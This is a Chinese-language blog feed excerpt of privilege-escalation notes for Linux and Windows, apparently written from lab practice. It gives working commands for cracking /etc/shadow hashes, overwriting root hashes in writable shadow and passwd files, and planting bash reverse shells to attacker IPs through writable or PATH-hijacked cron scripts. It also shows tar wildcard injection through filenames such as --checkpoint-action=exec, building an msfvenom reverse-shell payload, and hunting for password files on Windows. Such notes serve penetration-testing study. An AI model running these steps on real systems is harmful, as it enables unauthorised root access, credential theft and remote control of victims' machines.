&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root:&lt;span class=&#34;token variable&#34;&gt;$6&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$mqjgcFoM&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$X&lt;/span&gt;/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;利用条件 shadow 有权查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213805632.png&#34; alt=&#34;image-20240221213805632&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取 root 用户信息并保存在新建文件中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213918116.png&#34; alt=&#34;image-20240221213918116&#34;&gt;&lt;/p&gt;
&lt;p&gt;root:&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;6&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::&lt;/p&gt;
&lt;p&gt;利用工具 john 来破解&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220225042.png&#34; alt=&#34;image-20240221220225042&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到明文密码就可以切换 root 了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220330572.png&#34; alt=&#34;image-20240221220330572&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;可写shadow文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可写shadow文件利用&#34;&gt;#&lt;/a&gt; 可写 shadow 文件利用&lt;/h4&gt;
&lt;p&gt;利用原理：把 shadow 文件里 root 用户 hash 值替换为自己生成的就可以 hash 再用生成用到的明文进行登录 root&lt;/p&gt;
&lt;p&gt;前提要有 shadow 可写权限&lt;/p&gt;
&lt;p&gt;通过 mkpasswd 生成哈希&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mkpasswd -m sha-512 1234567&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$6$hpRA5YNV9lAANtsF$JwX/K8VfxhxpTm5U2oTEgFw.YiYVCmfzZ0i6SqUDkpJRamWVmQ0LgflQUlhjVHkAS5N8MwFFR12mHBg6qFhwC/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221309745.png&#34; alt=&#34;image-20240221221309745&#34;&gt;&lt;/p&gt;
&lt;p&gt;用 sha-521 是因为&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$6&lt;/span&gt;$开头的，表明是用SHA-512加密的，密文长度86&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;$ 表明是用MD5加密的，密文长度22个字符&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$2&lt;/span&gt;$ 是用Blowfish加密的，&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$5&lt;/span&gt;$ 是用 SHA-256加密的，密文长度43&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接着把生成的 hash 替换原本的就可以用 1234567 登陆了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221617115.png&#34; alt=&#34;image-20240221221617115&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;可写passwd文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可写passwd文件利用&#34;&gt;#&lt;/a&gt; 可写 passwd 文件利用&lt;/h4&gt;
&lt;p&gt;虽然 passwd 文件里 hash 被 X 替代了无法查看但是把 X 替换为我们生成的 hash 还是可以登陆的&lt;/p&gt;
&lt;p&gt;利用 openssl 生成&lt;/p&gt;
&lt;p&gt;&lt;code&gt;openssl passwd 987654321&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$1$uOZ/Tr4f$EqDyR9WU8wJNeB3tEY09f.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;把 passwd 里 root 的 X 替换&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221222616639.png&#34; alt=&#34;image-20240221222616639&#34;&gt;&lt;/p&gt;
&lt;p&gt;即可用 987654321 切换 root&lt;/p&gt;
&lt;h4 id=&#34;计划任务提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务提权&#34;&gt;#&lt;/a&gt; 计划任务提权&lt;/h4&gt;
&lt;p&gt;查看计划任务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222000243892.png&#34; alt=&#34;image-20240222000243892&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;* * * * * root    /home/crontab.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这条计划任务的意思是每 1 分钟执行一次 crontab.sh 脚本，并且是以 root 用户的权限来执行。&lt;/p&gt;
&lt;p&gt;而这个文件我们是有权更改的那么就可以写入反弹 shell 命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo &#39;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.139/4444 0&amp;gt;&amp;amp;1&amp;quot;&#39; &amp;gt; crontab.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nc 进行监听等一分钟拿 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222003928818.png&#34; alt=&#34;image-20240222003928818&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222005508201.png&#34; alt=&#34;image-20240222005508201&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;计划任务环境变量提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务环境变量提权&#34;&gt;#&lt;/a&gt; 计划任务环境变量提权&lt;/h4&gt;
&lt;p&gt;如果你在计划任务中没有指定程序的绝对路径，系统会在 crontab 文件中的 &lt;code&gt;PATH&lt;/code&gt;  环境变量所列出的目录中查找该程序。这些目录会按照在 &lt;code&gt;PATH&lt;/code&gt;  变量中的顺序被检查。如果在某个目录中找到了该程序，系统就会停止搜索并执行该程序。&lt;/p&gt;
&lt;p&gt;图中每分钟执行一次 &lt;code&gt;shell.sh&lt;/code&gt;  脚本但是没有指定绝对路径， &lt;code&gt;PATH&lt;/code&gt;  中默认优先查找 /home/yunyi 路径下有没有 shell.sh 有的话&lt;/p&gt;
&lt;p&gt;就每分钟执行，利用这个特性就可以在 &lt;code&gt;yunyi&lt;/code&gt;  目录中创建一个 &lt;code&gt;shell.sh&lt;/code&gt;  并写上反弹 shell 进行提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png&#34; alt=&#34;image-20240223220655325&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#!/bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.142/7676 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220835815.png&#34; alt=&#34;image-20240223220835815&#34;&gt;&lt;/p&gt;
&lt;p&gt;别忘了给执行权限 &lt;code&gt;chmod +x shell.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;kali：nc -vlnp 7676&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;获取 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221033086.png&#34; alt=&#34;image-20240223221033086&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;计划任务统配符提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务统配符提权&#34;&gt;#&lt;/a&gt; 计划任务统配符提权&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png&#34; alt=&#34;image-20240223220655325&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里还有一个 zip.sh 看一下内容是&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221316077.png&#34; alt=&#34;image-20240223221316077&#34;&gt;&lt;/p&gt;
&lt;p&gt;到 home/yunyi/user 目录下打包所有文件夹文件到 /tmp 目录下名为 yunyi.tar.gz&lt;/p&gt;
&lt;p&gt;利用 tar &lt;code&gt;命令的&lt;/code&gt; –checkpoint &lt;code&gt;和&lt;/code&gt; –checkpoint-action&lt;/p&gt;
&lt;p&gt;tar &lt;code&gt;命令的&lt;/code&gt; –checkpoint &lt;code&gt;和&lt;/code&gt; –checkpoint-action &lt;code&gt;参数可以被用来执行提权操作这是因为&lt;/code&gt;  tar` 命令在处理文件时，可以在每个检查点 checkpoint 执行一个特定的动作 action&lt;/p&gt;
&lt;p&gt;如果管理员给予了某个普通用户 &lt;code&gt;tar&lt;/code&gt;  命令的超级管理员操作权限，那么我们可以使用 &lt;code&gt;tar&lt;/code&gt;  命令进行提权例如，以下命令可以创建一个新的归档文件，并在每个检查点执行 &lt;code&gt;/bin/bash&lt;/code&gt;  命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&amp;quot;/bin/bash&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在这个命令中， &lt;code&gt;--checkpoint=1&lt;/code&gt;  表示每处理一个文件就设置一个检查点， &lt;code&gt;--checkpoint-action=exec=&amp;quot;/bin/bash&amp;quot;&lt;/code&gt;  表示在每个检查点执行 &lt;code&gt;/bin/bash&lt;/code&gt;  命令因为 &lt;code&gt;tar&lt;/code&gt;  命令是以 &lt;code&gt;root&lt;/code&gt;  用户的身份运行的，所以 &lt;code&gt;/bin/bash&lt;/code&gt;  命令也会以 &lt;code&gt;root&lt;/code&gt;  用户的身份运行，从而获得 &lt;code&gt;root&lt;/code&gt;  权限&lt;/p&gt;
&lt;p&gt;kali 生成反弹 shell 文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=8989 -f elf -o shell.elf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;启动一个 http 服务受害机下载 shell 文件并给予权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132512587.png&#34; alt=&#34;image-20240224132512587&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132558854.png&#34; alt=&#34;image-20240224132558854&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 user 目录创建这两个文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint-action=exec=shell.elf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224133036613.png&#34; alt=&#34;image-20240224133036613&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224140015673.png&#34; alt=&#34;image-20240224140015673&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -lvnp 8989&lt;/code&gt;  拿到权限&lt;/p&gt;
&lt;p&gt;也可以创建一个 sh 脚本反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touch /home/yunyi/user/--checkpoint-action=exec=sh shell.sh&lt;/code&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/</guid>
            <title>Windows提权</title>
            <link>http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/</link>
            <pubDate>Thu, 09 Nov 2023 20:28:50 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;提权基础&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提权基础&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;提权基础&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;获取 webshell 后一般都是 www-data 权限权限很低所以要进行提权把权限提高为了后续渗透顺利&lt;/p&gt;
&lt;p&gt;windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权 ftp 提权 令牌窃取提权等姿势。&lt;/p&gt;
&lt;p&gt;使用 Windows 命令提示符执行的，它将系统信息输出到名为 &amp;quot;a.txt&amp;quot; 的文件中，然后检查特定的 Windows 更新是否已安装。如果某些指定的更新未安装，它会输出一条消息表示这些更新未安装。最后，它会删除临时文件 &amp;quot;a.txt&lt;/p&gt;
&lt;p&gt;systeminfo&amp;gt;a.txt&amp;amp;(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;amp;del /f /q /a a.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110225111274.png&#34; alt=&#34;image-20231110225111274&#34;&gt;&lt;/p&gt;
&lt;p&gt;提权辅助:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4v&#34;&gt;https://i.hacking8.com/tiquan/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;windows 漏洞集合&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=&#34;&gt; https://github.com/SecWiki/windows-kernel-exploits&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;收集信息常用命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#收集信息常用命令&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;收集信息常用命令&lt;/span&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ipconfig /all                                            --网卡配置&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systeminfo                                               --系统补丁信息等&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo %PROCESSOR_ARCHITECTURE%                            --系统体系结构&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic product get name,version                            --安装软件、版本、路径&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic service list brief                                  --查询本机服务信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;tasklist -svc                                            --进程查看&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;schtasks /query /fo list /v                              --任务计划查询&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net statistics workstation                               --开机时间&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user                                                 --查看用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whoami /all                                              --SID等用户信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net localgroup administrators                            --查看管理员组中的用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net session                                              --会话查看&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netstat -ano                                             --网络连接以及通过端口判断服务&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net share                                                --共享&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;route print                                              --路由信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp -a                                                   --arp信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cmdkey /l                                                --登录历史&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hosts文件  Linux：/etc/hosts  Windows：c:\Windows\system32\drivers\etc\hosts&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ipconfig  /displaydns                                    --dns缓存&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net view                                                 --查看共享&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dir /s /b &#34;pass&#34; &#34;user&#34; &#34;config&#34; &#34;username.&#34; &#34;password.&#34; --命令行查找敏感文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;findstr  /s /m &#34;password&#34; *.*                            --寻找包含密码字段的文件，如数据库密码文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user /domain                                         --查看域用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net time /domain                                         --查看时间服务器（可能为DC）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net group &#34;domain admins&#34; /domain                        --查看域管理员&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net group &#34;domaincontrollers&#34; /domain                    --查看域控制器&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;net user 显示当前系统中的所有用户信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110133913521.png&#34; alt=&#34;image-20231110133913521&#34;&gt;&lt;/p&gt;
&lt;p&gt;net user 31166 查看用户详细信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134358877.png&#34; alt=&#34;image-20231110134358877&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;whoami-all&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#whoami-all&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;whoami /all&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取当前用户详细信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134649977.png&#34; alt=&#34;image-20231110134649977&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;hostname&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hostname&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;hostname&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取主机名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134745836.png&#34; alt=&#34;image-20231110134745836&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;whoami-priv&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#whoami-priv&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;whoami /priv&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取当前用户的安全特权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134929728.png&#34; alt=&#34;image-20231110134929728&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;net-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#net-start&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;net start&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取已经启动的 Windows 服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110135119067.png&#34; alt=&#34;image-20231110135119067&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;systeminfo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#systeminfo&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;systeminfo&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;获取电脑打了那些补丁为之后提权打下基础&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151656666.png&#34; alt=&#34;image-20231110151656666&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;扫描可写可读目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扫描可写可读目录&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;扫描可写可读目录&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151233596.png&#34; alt=&#34;image-20231110151233596&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;windows常用提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows常用提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;windows 常用提权&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&#34;ms16-075烂土豆提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ms16-075烂土豆提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;MS16-075 烂土豆提权&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;影响版本：Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2012 等&lt;/p&gt;
&lt;p&gt;下载网址&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1N3ZWV0UG90YXRv&#34;&gt;https://github.com/uknowsec/SweetPotato&lt;/span&gt;&lt;/p&gt;
